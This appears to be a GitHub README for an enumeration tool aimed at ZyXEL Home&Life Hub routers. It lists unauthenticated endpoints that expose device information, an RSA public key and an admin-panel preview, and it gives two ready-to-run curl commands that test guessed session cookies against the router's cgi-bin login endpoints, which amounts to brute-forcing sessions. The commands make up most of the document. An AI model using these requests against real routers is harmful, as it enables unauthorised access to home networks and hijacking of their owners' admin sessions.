# Home-Life-Hub-enumeration
![alt-text](https://github.com/n0nexist/Home-Life-Hub-enumeration/blob/main/screenshot.png?raw=true)<br><br>
Enumeration of <b>Home&amp;Life Hub</b> routers from <b><i>ZyXEL Communications Corp</b></i>.
<br>

# [BASIC ENUMERATION] Script Usage - less informations
```
python3 HomeLifeHub.py (router's ip)
```

# [IMPORTANT] Manual Enumeration - more informations
<b>Basic information</b> -> ```http://{target}/getBasicInformation```
<br>
<b>RSA public key</b> -> ```http://{target}/getRSAPublickKey```
<br>
<b>Get a preview of the admin panel</b> -> ```http://{target}/static/lang/```

# [SESSION BRUTEFORCE] Check if a session cookie is valid
```
curl -i -s -k -X $'GET' \
    -H $'Host: TARGET_IP' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36' -H $'X-Requested-With: XMLHttpRequest' -H $'Referer: http://TARGET_IP/login' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    -b $'Session=PROBABLY_9_DIGITS' \
    $'http://TARGET_IP/cgi-bin/DAL?oid=login_privilege'
```
<i>This will return <b>401</b> or <b>200 + session data</b> depending if the session cookie is valid</i>.
<br><br>
<b>Alternative:</b>
```
curl -i -s -k -X $'GET' \
    -H $'Host: TARGET_IP' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36' -H $'X-Requested-With: XMLHttpRequest' -H $'Referer: http://TARGET_IP/login' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    -b $'Session=PROBABLY_9_DIGITS' \
    $'http://TARGET_IP/cgi-bin/UserLoginCheck'
```
<i>This will return <b>401</b> or <b>200</b> depending if the session cookie is valid</i>.
